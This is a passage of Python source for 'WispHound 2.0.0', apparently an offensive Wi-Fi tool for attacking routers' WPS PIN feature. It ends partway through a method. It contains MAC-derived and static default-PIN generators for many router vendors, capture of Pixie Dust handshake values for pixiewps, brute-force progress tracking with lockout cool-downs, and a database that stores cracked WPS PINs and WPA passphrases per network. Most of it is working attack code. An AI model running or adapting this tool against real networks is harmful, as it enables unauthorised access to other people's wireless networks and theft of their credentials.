#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WispHound 2.0.0 — WPS reconnaissance and Pixie Dust prioritization.

Major changes vs 1.0.0:
  * Security: pixiewps invoked with argument list (no shell); all hex validated.
  * Performance: checksum lookup table, PIN dedup, per-target PIN cache.
  * Reliability: pixiewps timeout + auto --force retry; robust result parsing.
  * Safety: WPS NACK counter + cool-down; lockout detection from scan.
  * Persistence: SQLite target DB with PIN reuse across runs.
  * Automation: --auto pipeline (scan → rank → attack).
  * Observability: --json / --jsonl structured output, --trace-log.
  * Correctness: scope-safe args, defensive NetworkAddress equality,
    reverse-scan as constructor param, tempdir leak guard, get_hex guard.
"""
import argparse
import codecs
import collections
import csv
import json
import os
import pathlib
import re
import shutil
import socket
import sqlite3
import statistics
import subprocess
import sys
import tempfile
import time
from array import array
from datetime import datetime
from pathlib import Path
from typing import Dict, Optional

try:
    import wcwidth
except ImportError:                                    # graceful degrade
    class _WC:
        @staticmethod
        def wcswidth(s):
            return len(s)
    wcwidth = _WC()


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
VERSION = '2.0.0'

PIXIE_VULNERABLE_CHIPSETS = {
    # Ralink / MediaTek (RT series)
    'RT2860': 'Ralink RT2860',
    'RT3070': 'Ralink RT3070',
    'RT3572': 'Ralink RT3572',
    'RT5370': 'Ralink RT5370',
    'MT7601': 'MediaTek MT7601',
    'MT7612': 'MediaTek MT7612',
    # Realtek RTL8xxx
    'RTL8188': 'Realtek RTL8188',
    'RTL8192': 'Realtek RTL8192',
    'RTL8812': 'Realtek RTL8812',
    # Broadcom
    'BCM4325': 'Broadcom BCM4325',
    'BCM4329': 'Broadcom BCM4329',
    'BCM4331': 'Broadcom BCM4331',
    # Atheros
    'AR9271': 'Atheros AR9271',
    'AR9340': 'Atheros AR9340',
}

# Minimal built-in OUI vendor table; extend with --oui=<file>
OUI_BUILTIN = {
    '0014D1': 'TRENDnet', '00904C': 'Epigram/Broadcom',
    'D4BF7F': 'Upvel', 'F8C091': 'Upvel',
    '0026CE': 'Onlime', '00664B': 'Huawei',
    '0023F8': 'Zyxel', 'C83A35': 'Tenda',
    '001CDF': 'Belkin', '002275': 'Belkin',
    '5C353B': 'Compal (CBN)', 'DC537C': 'Compal (CBN)',
    '0018E7': 'Cameo', '001AA9': 'Fujitsu',
    '200BC7': 'Ralink/MediaTek', '4846FB': 'Ralink/MediaTek',
    'D46AA8': 'Ralink/MediaTek', 'F84ABF': 'Ralink/MediaTek',
}


# ---------------------------------------------------------------------------
# Checksum lookup table (10M entries -> ~10 MB, ready in ~2.5 s)
# ---------------------------------------------------------------------------
def _build_checksum_table():
    table = array('b', [0]) * 10_000_000
    for i in range(10_000_000):
        p, accum = i, 0
        while p:
            accum += 3 * (p % 10)
            p //= 10
            accum += p % 10
            p //= 10
        table[i] = (10 - accum % 10) % 10
    return table


def get_hex(line):
    """Extract hex payload from a wpa_supplicant hexdump line."""
    parts = line.split(':', 3)
    if len(parts) < 3:
        return ''
    return parts[2].replace(' ', '').upper()


def recvuntil(pipe, what):
    s = ''
    while True:
        inp = pipe.stdout.read(1)
        if inp == '':
            return s
        s += inp
        if what in s:
            return s


# ---------------------------------------------------------------------------
# NetworkAddress
# ---------------------------------------------------------------------------
class NetworkAddress:
    def __init__(self, mac):
        if isinstance(mac, NetworkAddress):
            self._int_repr = mac._int_repr
            self._str_repr = mac._str_repr
        elif isinstance(mac, int):
            self._int_repr = mac
            self._str_repr = self._int2mac(mac)
        elif isinstance(mac, str):
            self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
            self._int_repr = self._mac2int(self._str_repr)
        else:
            raise ValueError('MAC address must be string or integer')

    @property
    def string(self):
        return self._str_repr

    @string.setter
    def string(self, value):
        self._str_repr = value
        self._int_repr = self._mac2int(value)

    @property
    def integer(self):
        return self._int_repr

    @integer.setter
    def integer(self, value):
        self._int_repr = value
        self._str_repr = self._int2mac(value)

    def __int__(self):
        return self.integer

    def __str__(self):
        return self.string

    def __iadd__(self, other):
        self.integer = self.integer + int(other)
        return self

    def __isub__(self, other):
        self.integer = self.integer - int(other)
        return self

    def _coerce(self, other):
        if isinstance(other, NetworkAddress):
            return other.integer
        try:
            return NetworkAddress(other).integer
        except (ValueError, AttributeError):
            return NotImplemented

    def __eq__(self, other):
        v = self._coerce(other)
        return NotImplemented if v is NotImplemented else self.integer == v

    def __ne__(self, other):
        v = self._coerce(other)
        return NotImplemented if v is NotImplemented else self.integer != v

    def __lt__(self, other):
        return self.integer < self._coerce(other)

    def __gt__(self, other):
        return self.integer > self._coerce(other)

    def __hash__(self):
        return hash(self._int_repr)

    @staticmethod
    def _mac2int(mac):
        return int(mac.replace(':', ''), 16)

    @staticmethod
    def _int2mac(mac):
        s = hex(mac).split('x')[-1].upper().zfill(12)
        return ':'.join(s[i:i+2] for i in range(0, 12, 2))

    def __repr__(self):
        return f'NetworkAddress(string={self._str_repr}, integer={self._int_repr})'


# ---------------------------------------------------------------------------
# WPSpin
# ---------------------------------------------------------------------------
class WPSpin:
    ALGO_MAC = 0
    ALGO_EMPTY = 1
    ALGO_STATIC = 2

    _CHECKSUM_TABLE = None   # lazy-built class-level cache

    def __init__(self):
        self._pin_cache = {}
        self.algos = {
            'pin24':       {'name': '24-bit PIN',        'mode': self.ALGO_MAC,    'gen': self.pin24},
            'pin28':       {'name': '28-bit PIN',        'mode': self.ALGO_MAC,    'gen': self.pin28},
            'pin32':       {'name': '32-bit PIN',        'mode': self.ALGO_MAC,    'gen': self.pin32},
            'pinDLink':    {'name': 'D-Link PIN',        'mode': self.ALGO_MAC,    'gen': self.pinDLink},
            'pinDLink1':   {'name': 'D-Link PIN +1',     'mode': self.ALGO_MAC,    'gen': self.pinDLink1},
            'pinASUS':     {'name': 'ASUS PIN',          'mode': self.ALGO_MAC,    'gen': self.pinASUS},
            'pinAirocon':  {'name': 'Airocon Realtek',   'mode': self.ALGO_MAC,    'gen': self.pinAirocon},
            'pinEmpty':    {'name': 'Empty PIN',         'mode': self.ALGO_EMPTY,  'gen': lambda mac: ''},
            'pinCisco':    {'name': 'Cisco',             'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
            'pinBrcm1':    {'name': 'Broadcom 1',        'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
            'pinBrcm2':    {'name': 'Broadcom 2',        'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484},
            'pinBrcm3':    {'name': 'Broadcom 3',        'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990},
            'pinBrcm4':    {'name': 'Broadcom 4',        'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714},
            'pinBrcm5':    {'name': 'Broadcom 5',        'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
            'pinBrcm6':    {'name': 'Broadcom 6',        'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719},
            'pinAirc1':    {'name': 'Airocon 1',         'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203},
            'pinAirc2':    {'name': 'Airocon 2',         'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225},
            'pinDSL2740R': {'name': 'DSL-2740R',         'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554},
            'pinRealtek1': {'name': 'Realtek 1',         'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
            'pinRealtek2': {'name': 'Realtek 2',         'mode': self.ALGO_STATIC, 'gen': lambda mac: 9571911},
            'pinRealtek3': {'name': 'Realtek 3',         'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
            'pinUpvel':    {'name': 'Upvel',             'mode': self.ALGO_STATIC, 'gen': lambda mac: 2085483},
            'pinUR814AC':  {'name': 'UR-814AC',          'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
            'pinUR825AC':  {'name': 'UR-825AC',          'mode': self.ALGO_STATIC, 'gen': lambda mac: 529417},
            'pinOnlime':   {'name': 'Onlime',            'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604},
            'pinEdimax':   {'name': 'Edimax',            'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153},
            'pinThomson':  {'name': 'Thomson',          'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814},
            'pinHG532x':   {'name': 'HG532x',            'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928},
            'pinH108L':    {'name': 'H108L',             'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
            'pinONO':      {'name': 'CBN ONO',           'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521},
        }

    @staticmethod
    def checksum(pin):
        """WPS checksum. Uses precomputed table for 0..9,999,999."""
        if WPSpin._CHECKSUM_TABLE is None:
            WPSpin._CHECKSUM_TABLE = _build_checksum_table()
        try:
            pin = int(pin)
        except (TypeError, ValueError):
            return 0
        if 0 <= pin < 10_000_000:
            return WPSpin._CHECKSUM_TABLE[pin]
        accum = 0
        while pin:
            accum += 3 * (pin % 10); pin //= 10
            accum += pin % 10;       pin //= 10
        return (10 - accum % 10) % 10

    def generate(self, algo, mac):
        key = (algo, str(mac))
        if key in self._pin_cache:
            return self._pin_cache[key]
        mac = mac if isinstance(mac, NetworkAddress) else NetworkAddress(mac)
        if algo not in self.algos:
            raise ValueError('Invalid WPS pin algorithm')
        pin = self.algos[algo]['gen'](mac)
        if algo == 'pinEmpty':
            result = pin
        else:
            pin = pin % 10000000
            result = (str(pin) + str(self.checksum(pin))).zfill(8)
        self._pin_cache[key] = result
        return result

    def getAll(self, mac, get_static=True):
        res = []
        for ID, algo in self.algos.items():
            if algo['mode'] == self.ALGO_STATIC and not get_static:
                continue
            prefix = 'Static PIN — ' if algo['mode'] == self.ALGO_STATIC else ''
            res.append({'id': ID, 'name': prefix + algo['name'],
                        'pin': self.generate(ID, mac)})
        return res

    def getList(self, mac, get_static=True):
        return [self.generate(ID, mac)
                for ID, algo in self.algos.items()
                if get_static or algo['mode'] != self.ALGO_STATIC]

    def getSuggested(self, mac):
        res = []
        for ID in self._suggest(mac):
            algo = self.algos[ID]
            prefix = 'Static PIN — ' if algo['mode'] == self.ALGO_STATIC else ''
            res.append({'id': ID, 'name': prefix + algo['name'],
                        'pin': self.generate(ID, mac)})
        return res

    def getSuggestedUnique(self, mac):
        """De-duplicated, priority-preserving list of suggested PINs."""
        seen, out = set(), []
        for item in self.getSuggested(mac):
            if item['pin'] in seen:
                continue
            seen.add(item['pin'])
            out.append(item)
        return out

    def getSuggestedList(self, mac):
        return [self.generate(a, mac) for a in self._suggest(mac)]

    def getLikely(self, mac):
        res = self.getSuggestedList(mac)
        return res[0] if res else None

    def _suggest(self, mac):
        mac = mac.replace(':', '').upper()
        algorithms = {
            'pin24': ('04BF6D','0E5D4E','107BEF','14A9E3','28285D','2A285D','32B2DC','381766','404A03','4E5D4E','5067F0','5CF4AB','6A285D','8E5D4E','AA285D','B0B2DC','C86C87','CC5D4E','CE5D4E','EA285D','E243F6','EC43F6','EE43F6','F2B2DC','FCF528','FEF528','4C9EFF','0014D1','D8EB97','1C7EE5','84C9B2','FC7516','14D64D','9094E4','BCF685','C4A81D','00664B','087A4C','14B968','2008ED','346BD3','4CEDDE','786A89','88E3AB','D46E5C','E8CD2D','EC233D','ECCB30','F49FF3','20CF30','90E6BA','E0CB4E','D4BF7F4','F8C091','001CDF','002275','08863B','00B00C','081075','C83A35','0022F7','001F1F','00265B','68B6CF','788DF7','BC1401','202BC1','308730','5C4CA9','62233D','623CE4','623DFF','6253D4','62559C','626BD3','627D5E','6296BF','62A8E4','62B686','62C06F','62C61F','62C714','62CBA8','62CDBE','62E87B','6416F0','6A1D67','6A233D','6A3DFF','6A53D4','6A559C','6A6BD3','6A96BF','6A7D5E','6AA8E4','6AC06F','6AC61F','6AC714','6ACBA8','6ACDBE','6AD15E','6AD167','721D67','72233D','723CE4','723DFF','7253D4','72559C','726BD3','727D5E','7296BF','72A8E4','72C06F','72C61F','72C714','72CBA8','72CDBE','72D15E','72E87B','0026CE','9897D1','E04136','B246FC','E24136','00E020','5CA39D','D86CE9','DC7144','801F02','E47CF9','000CF6','00A026','A0F3C1','647002','B0487A','F81A67','F8D111','34BA9A','B4944E'),
            'pin28': ('200BC7','4846FB','D46AA8','F84ABF'),
            'pin32': ('000726','D8FEE3','FC8B97','1062EB','1C5F2B','48EE0C','802689','908D78','E8CC18','2CAB25','10BF48','14DAE9','3085A9','50465D','5404A6','C86000','F46D04','801F02'),
            'pinDLink': ('14D64D','1C7EE5','28107B','84C9B2','A0AB1B','B8A386','C0A0BB','CCB255','FC7516','0014D1','D8EB97'),
            'pinDLink1': ('0018E7','00195B','001CF0','001E58','002191','0022B0','002401','00265A','14D64D','1C7EE5','340804','5CD998','84C9B2','B8A386','C8BE19','C8D3A3','CCB255','0014D1'),
            'pinASUS': ('049226','04D9F5','08606E','0862669','107B44','10BF48','10C37B','14DDA9','1C872C','1CB72C','2C56DC','2CFDA1','305A3A','382C4A','38D547','40167E','50465D','54A050','6045CB','60A44C','704D7B','74D02B','7824AF','88D7F6','9C5C8E','AC220B','AC9E17','B06EBF','BCEE7B','C860007','D017C2','D850E6','E03F49','F0795978','F832E4','00072624','0008A1D3','00177C','001EA6','00304FB','00E04C0','048D38','081077','081078','081079','083E5D','10FEED3C','181E78','1C4419','2420C7','247F20','2CAB25','3085A98C','3C1E04','40F201','44E9DD','48EE0C','5464D9','54B80A','587BE906','60D1AA21','64517E','64D954','6C198F','6C7220','6CFDB9','78D99FD','7C2664','803F5DF6','84A423','88A6C6','8C10D4','8C882B00','904D4A','907282','90F65290','94FBB2','A01B29','A0F3C1E','A8F7E00','ACA213','B85510','B8EE0E','BC3400','BC9680','C891F9','D00ED90','D084B0','D8FEE3','E4BEED','E894F6F6','EC1A5971','EC4C4D','F42853','F43E61','F46BEF','F8AB05','FC8B97','7062B8','78542E','C0A0BB8C','C412F5','C4A81D','E8CC18','EC2280','F8E903F4'),
            'pinAirocon': ('0007262F','000B2B4A','000EF4E7','001333B','00177C','001AEF','00E04BB3','02101801','0810734','08107710','1013EE0','2CAB25C7','788C54','803F5DF6','94FBB2','BC9680','F43E61','FC8B97'),
            'pinEmpty': ('E46F13','EC2280','58D56E','1062EB','10BEF5','1C5F2B','802689','A0AB1B','74DADA','9CD643','68A0F6','0C96BF','20F3A3','ACE215','C8D15E','000E8F','D42122','3C9872','788102','7894B4','D460E3','E06066','004A77','2C957F','64136C','74A78E','88D274','702E22','74B57E','789682','7C3953','8C68C8','D476EA','344DEA','38D82F','54BE53','709F2D','94A7B7','981333','CAA366','D0608C'),
            'pinCisco': ('001A2B','00248C','002618','344DEB','7071BC','E06995','E0CB4E','7054F5'),
            'pinBrcm1': ('ACF1DF','BCF685','C8D3A3','988B5D','001AA9','14144B','EC6264'),
            'pinBrcm2': ('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685','C8BE19'),
            'pinBrcm3': ('14D64D','1C7EE5','28107B','B8A386','BCF685','C8BE19','7C034C'),
            'pinBrcm4': ('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685','C8BE19','C8D3A3','CCB255','FC7516','204E7F','4C17EB','18622C','7C03D8','D86CE9'),
            'pinBrcm5': ('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685','C8BE19','C8D3A3','CCB255','FC7516','204E7F','4C17EB','18622C','7C03D8','D86CE9'),
            'pinBrcm6': ('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685','C8BE19','C8D3A3','CCB255','FC7516','204E7F','4C17EB','18622C','7C03D8','D86CE9'),
            'pinAirc1': ('181E78','40F201','44E9DD','D084B0'),
            'pinAirc2': ('84A423','8C10D4','88A6C6'),
            'pinDSL2740R': ('00265A','1CBDB9','340804','5CD998','84C9B2','FC7516'),
            'pinRealtek1': ('0014D1','000C42','000EE8'),
            'pinRealtek2': ('007263','E4BEED'),
            'pinRealtek3': ('08C6B3',),
            'pinUpvel': ('784476','D4BF7F0','F8C091'),
            'pinUR814AC': ('D4BF7F60',),
            'pinUR825AC': ('D4BF7F5',),
            'pinOnlime': ('D4BF7F','F8C091','144D67','784476','0014D1'),
            'pinEdimax': ('801F02','00E04C'),
            'pinThomson': ('002624','4432C8','88F7C7','CC03FA'),
            'pinHG532x': ('00664B','086361','087A4C','0C96BF','14B968','2008ED','2469A5','346BD3','786A89','88E3AB','9CC172','ACE215','D07AB5','CCA223','E8CD2D','F80113','F83DFF'),
            'pinH108L': ('4C09B4','4CAC0A','84742A4','9CD24B','B075D5','C864C7','DC028E','FCC897'),
            'pinONO': ('5C353B','DC537C'),
        }
        res = []
        for algo_id, masks in algorithms.items():
            for mask in masks:
                if mac.startswith(mask):
                    res.append(algo_id)
                    break
        return res

    def pin24(self, mac):   return mac.integer & 0xFFFFFF
    def pin28(self, mac):   return mac.integer & 0xFFFFFFF
    def pin32(self, mac):   return mac.integer % 0x100000000

    def pinDLink(self, mac):
        nic = mac.integer & 0xFFFFFF
        pin = nic ^ 0x55AA55
        pin ^= (((pin & 0xF) << 4) + ((pin & 0xF) << 8) +
                ((pin & 0xF) << 12) + ((pin & 0xF) << 16) +
                ((pin & 0xF) << 20))
        pin %= int(10e6)
        if pin < int(10e5):
            pin += ((pin % 9) * int(10e5)) + int(10e5)
        return pin

    def pinDLink1(self, mac):
        m = NetworkAddress(mac)
        m.integer += 1
        return self.pinDLink(m)

    def pinASUS(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        s = ''.join(str((b[i % 6] + b[5]) %
                        (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7))
                    for i in range(7))
        return int(s)

    def pinAirocon(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        return (((b[0] + b[1]) % 10) +
                (((b[5] + b[0]) % 10) * 10) +
                (((b[4] + b[5]) % 10) * 100) +
                (((b[3] + b[4]) % 10) * 1000) +
                (((b[2] + b[3]) % 10) * 10000) +
                (((b[1] + b[2]) % 10) * 100000) +
                (((b[0] + b[1]) % 10) * 1000000))


# ---------------------------------------------------------------------------
# PixiewpsData
# ---------------------------------------------------------------------------
class PixiewpsData:
    _HEX_FIELDS = {
        'pke': 384, 'pkr': 384, 'e_nonce': 32,
        'authkey': 64, 'e_hash1': 64, 'e_hash2': 64,
    }

    def __init__(self):
        self.pke = ''
        self.pkr = ''
        self.e_hash1 = ''
        self.e_hash2 = ''
        self.authkey = ''
        self.e_nonce = ''

    def clear(self):
        self.__init__()

    def got_all(self):
        return (self.pke and self.pkr and self.e_nonce and self.authkey
                and self.e_hash1 and self.e_hash2)

    def _validate(self):
        for name, length in self._HEX_FIELDS.items():
            v = getattr(self, name)
            if len(v) != length:
                raise ValueError(
                    f'Field {name} has length {len(v)}, expected {length}')
            if not all(c in '0123456789ABCDEF' for c in v):
                raise ValueError(f'Field {name} is not valid hex')

    def get_pixie_args(self, full_range=False):
        """Return pixiewps argv list; validates all fields are safe hex."""
        self._validate()
        args = ['pixiewps',
                '--pke', self.pke, '--pkr', self.pkr,
                '--e-hash1', self.e_hash1, '--e-hash2', self.e_hash2,
                '--authkey', self.authkey, '--e-nonce', self.e_nonce]
        if full_range:
            args.append('--force')
        return args

    def get_pixie_cmd(self, full_range=False):
        """Human-readable command (for --show-pixie-cmd / logs)."""
        return ' '.join(self.get_pixie_args(full_range))


# ---------------------------------------------------------------------------
# Status trackers
# ---------------------------------------------------------------------------
class ConnectionStatus:
    def __init__(self):
        self.status = ''
        self.last_m_message = 0
        self.essid = ''
        self.wpa_psk = ''
        self.nack_count = 0
        self.locked = False

    def isFirstHalfValid(self):
        return self.last_m_message > 5

    def clear(self):
        self.__init__()


class BruteforceStatus:
    def __init__(self):
        self.start_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        self.mask = ''
        self.last_attempt_time = time.time()
        self.attempts_times = collections.deque(maxlen=15)
        self.counter = 0
        self.statistics_period = 5

    def display_status(self):
        avg = statistics.mean(self.attempts_times) if self.attempts_times else 0
        if len(self.mask) == 4:
            pct = int(self.mask) / 11000 * 100
        else:
            pct = ((10000 / 11000) + (int(self.mask[4:]) / 11000)) * 100
        print(f'[*] {pct:.2f}% complete @ {self.start_time} '
              f'({avg:.2f} seconds/pin)')

    def registerAttempt(self, mask):
        self.mask = mask
        self.counter += 1
        now = time.time()
        self.attempts_times.append(now - self.last_attempt_time)
        self.last_attempt_time = now
        if self.counter == self.statistics_period:
            self.counter = 0
            self.display_status()

    def clear(self):
        self.__init__()


# ---------------------------------------------------------------------------
# TargetDB — SQLite-backed persistence
# ---------------------------------------------------------------------------
class TargetDB:
    SCHEMA = """
    CREATE TABLE IF NOT EXISTS targets (
        bssid TEXT PRIMARY KEY,
        essid TEXT, model TEXT, model_number TEXT, device_name TEXT,
        chipset TEXT, pixie_vuln INTEGER DEFAULT 0, locked INTEGER DEFAULT 0,
        wps_pin TEXT, wpa_psk TEXT,
        last_seen TEXT, attempts INTEGER DEFAULT 0, success INTEGER DEFAULT 0
    );
    CREATE TABLE IF NOT EXISTS oui_vendor (
        prefix TEXT PRIMARY KEY, vendor TEXT
    );
    """

    def __init__(self, path):
        self.path = path
        Path(path).parent.mkdir(parents=True, exist_ok=True)
        self.conn = sqlite3.connect(path)
        self.conn.executescript(self.SCHEMA)
        self.conn.commit()
        self._seed_oui()

    def _seed_oui(self):
        self.conn.executemany(
            'INSERT OR IGNORE INTO oui_vendor (prefix, vendor) VALUES (?,?)',
            list(OUI_BUILTIN.items()))
        self.conn.commit()

    def load_oui_file(self, path):
        with open(path, 'r', encoding='utf-8', errors='replace') as f:
            rows = []
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                parts = re.split(r'\s+', line, maxsplit=1)
                if len(parts) == 2:
                    prefix = parts[0].replace(':', '').replace('-', '').upper()[:6]
                    rows.append((prefix, parts[1]))
            self.conn.executemany(
                'INSERT OR IGNORE INTO oui_vendor (prefix, vendor) VALUES (?,?)',
                rows)
            self.conn.commit()

    def vendor_for(self, bssid):
        prefix = bssid.replace(':', '').upper()[:6]
        cur = self.conn.execute(
            'SELECT vendor FROM oui_vendor WHERE prefix=?', (prefix,))
        row = cur.fetchone()
        return row[0] if row else 'Unknown'

    def upsert(self, net):
        self.conn.execute("""
            INSERT INTO targets (bssid, essid, model, model_number, device_name,
                                 chipset, pixie_vuln, locked, last_seen)
            VALUES (?,?,?,?,?,?,?,?, datetime('now'))
            ON CONFLICT(bssid) DO UPDATE SET
                essid=excluded.essid, model=excluded.model,
                model_number=excluded.model_number,
                device_name=excluded.device_name,
                chipset=excluded.chipset, pixie_vuln=excluded.pixie_vuln,
                locked=excluded.locked, last_seen=datetime('now')
        """, (net['BSSID'], net.get('ESSID', 'HIDDEN'), net.get('Model', ''),
              net.get('Model number', ''), net.get('Device name', ''),
              net.get('Chipset', ''), int(net.get('Pixie vulnerable', False)),
              int(net.get('WPS locked', False))))
        self.conn.commit()

    def known_pin(self, bssid):
        cur = self.conn.execute(
            'SELECT wps_pin FROM targets WHERE bssid=? AND wps_pin IS NOT NULL '
            'AND wps_pin != ""', (bssid,))
        row = cur.fetchone()
        return row[0] if row else None

    def save_credentials(self, bssid, essid, pin, psk):
        self.conn.execute(
            'UPDATE targets SET wps_pin=?, wpa_psk=?, success=1 '
            'WHERE bssid=?', (pin, psk, bssid))
        if self.conn.total_changes == 0:
            self.conn.execute(
                'INSERT INTO targets (bssid, essid, wps_pin, wpa_psk, success, '
                'last_seen) VALUES (?,?,?,?,1, datetime("now"))',
                (bssid, essid, pin, psk))
        self.conn.commit()

    def bump_attempts(self, bssid):
        self.conn.execute(
            'UPDATE targets SET attempts = attempts + 1 WHERE bssid=?',
            (bssid,))
        self.conn.commit()

    def close(self):
        try:
            self.conn.close()
        except Exception:
            pass


# ---------------------------------------------------------------------------
# Companion
# ---------------------------------------------------------------------------
class Companion:
    def __init__(self, interface, save_result=False, print_debug=False,
                 bssid='', db: Optional[TargetDB] = None,
                 json_mode=False, trace_log=None,
                 pixiewps_timeout=120, cool_down=60):
        self.interface = interface
        self.save_result = save_result
        self.print_debug = print_debug
        self.json_mode = json_mode
        self.pixiewps_timeout = pixiewps_timeout
        self.cool_down = cool_down
        self._constructed = False

        self.tempdir = tempfile.mkdtemp()
        try:
            with tempfile.NamedTemporaryFile(
                    mode='w', suffix='.conf', delete=False) as temp:
                temp.write(
                    f'ctrl_interface={self.tempdir}\n'
                    'ctrl_interface_group=root\nupdate_config=1\n')
                self.tempconf = temp.name
            self.wpas_ctrl_path = f'{self.tempdir}/{interface}'
            self.__init_wpa_supplicant()

            self.res_socket_file = (
                f'{tempfile._get_default_tempdir()}/'
                f'{next(tempfile._get_candidate_names())}')
            self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
            self.retsock.bind(self.res_socket_file)
        except Exception:
            self._cleanup_partial()
            raise

        self.pixie_creds = PixiewpsData()
        self.connection_status = ConnectionStatus()

        home = str(pathlib.Path.home())
        self.sessions_dir = f'{home}/.WispHound/sessions/'
        self.pixiewps_dir = f'{home}/.WispHound/pixiewps/'
        self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
        for d in (self.sessions_dir, self.pixiewps_dir):
            os.makedirs(d, exist_ok=True)

        self.db = db or TargetDB(f'{home}/.WispHound/targets.db')
        self._own_db = db is None

        self.generator = WPSpin()
        self.bssid = bssid
        self.lastPwr = 0
        self.target_is_pixie_vuln = False
        self.target_chipset = ''

        self._trace_fp = open(trace_log, 'a', encoding='utf-8') if trace_log else None
        self._constructed = True

    # ---- cleanup helpers ---------------------------------------------------
    def _cleanup_partial(self):
        try:
            if getattr(self, 'retsock', None):
                self.retsock.close()
        except Exception:
            pass
        try:
            if getattr(self, 'res_socket_file', None) and \
                    os.path.exists(self.res_socket_file):
                os.remove(self.res_socket_file)
        except Exception:
            pass
        try:
            if getattr(self, 'wpas', None):
                self.wpas.terminate()
        except Exception:
            pass
        shutil.rmtree(getattr(self, 'tempdir', ''), ignore_errors=True)
        try:
            os.remove(getattr(self, 'tempconf', ''))
        except Exception:
            pass

    def cleanup(self):
        self._cleanup_partial()
        if getattr(self, '_trace_fp', None):
            try:
                self._trace_fp.close()
            except Exception:
                pass
        if getattr(self, '_own_db', False) and getattr(self, 'db', None):
            self.db.close()

    def __del__(self):
        try:
            self.cleanup()
        except Exception:
            pass

    # ---- wpa_supplicant plumbing ------------------------------------------
    def __init_wpa_supplicant(self):
        print('[*] Running wpa_supplicant…')
        cmd = (f'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired '
               f'-i{self.interface} -c{self.tempconf}')
        self.wpas = subprocess.Popen(
            cmd, shell=True, stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
        while True:
            ret = self.wpas.poll()
            if ret is not None and ret != 0:
                raise ValueError(
                    'wpa_supplicant returned an error: '
                    + (self.wpas.communicate()[0] or ''))
            if os.path.exists(self.wpas_ctrl_path):
                break
            time.sleep(.1)

    def sendOnly(self, command):
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)

    def sendAndReceive(self, command):
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
        b, _ = self.retsock.recvfrom(4096)
        return b.decode('utf-8', errors='replace')

    @staticmethod
    def _explain_wpas_not_ok_status(command, respond):
        if command.startswith(('WPS_REG', 'WPS_PBC')) and respond == 'UNKNOWN COMMAND':
            return ('[!] wpa_supplicant is compiled without WPS protocol support. '
                    'Rebuild with CONFIG_WPS=y')
        return '[!] Something went wrong — check out debug log'

    # ---- json helper -------------------------------------------------------
    def _emit_json(self, event, **fields):
        if not self.json_mode:
            return
        rec = {'ts': datetime.now().isoformat(), 'event': event, **fields}
        print(json.dumps(rec, ensure_ascii=False), flush=True)

    # ---- main log parser --------------------------------------------------
    def __handle_wpas(self, pixiemode=False, pbc_mode=False, verbose=None,
                      bssid=''):
        if not verbose:
            verbose = self.print_debug
        line = self.wpas.stdout.readline()
        if not line:
            self.wpas.wait()
            return False
        line = line.rstrip('\n')

        if verbose:
            sys.stderr.write(line + '\n')
        if self._trace_fp:
            self._trace_fp.write(line + '\n')

        if line.startswith('WPS: '):
            if 'Building Message M' in line:
                n = int(line.split('Building Message M')[1].replace('D', ''))
                self.connection_status.last_m_message = n
                self.__print_with_indicators(
                    '*', f'Sending WPS Message M{n}…')
            elif 'Received M' in line:
                n = int(line.split('Received M')[1])
                self.connection_status.last_m_message = n
                self.__print_with_indicators(
                    '*', f'Received WPS Message M{n}')
                if n == 5:
                    print('[+] The first half of the PIN is valid')
            elif 'Received WSC_NACK' in line:
                self.connection_status.status = 'WSC_NACK'
                self.connection_status.nack_count += 1
                self.__print_with_indicators('*', 'Received WSC NACK')
                print('[-] Error: wrong PIN code')
            elif 'Enrollee Nonce' in line and 'hexdump' in line:
                self.pixie_creds.e_nonce = get_hex(line)
                if pixiemode:
                    print(f'[P] E-Nonce: {self.pixie_creds.e_nonce}')
            elif 'DH own Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pkr = get_hex(line)
                if pixiemode:
                    print(f'[P] PKR: {self.pixie_creds.pkr}')
            elif 'DH peer Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pke = get_hex(line)
                if pixiemode:
                    print(f'[P] PKE: {self.pixie_creds.pke}')
            elif 'AuthKey' in line and 'hexdump' in line:
                self.pixie_creds.authkey = get_hex(line)
                if pixiemode:
                    print(f'[P] AuthKey: {self.pixie_creds.authkey}')
            elif 'E-Hash1' in line and 'hexdump' in line:
                self.pixie_creds.e_hash1 = get_hex(line)
                if pixiemode:
                    print(f'[P] E-Hash1: {self.pixie_creds.e_hash1}')
            elif 'E-Hash2' in line and 'hexdump' in line:
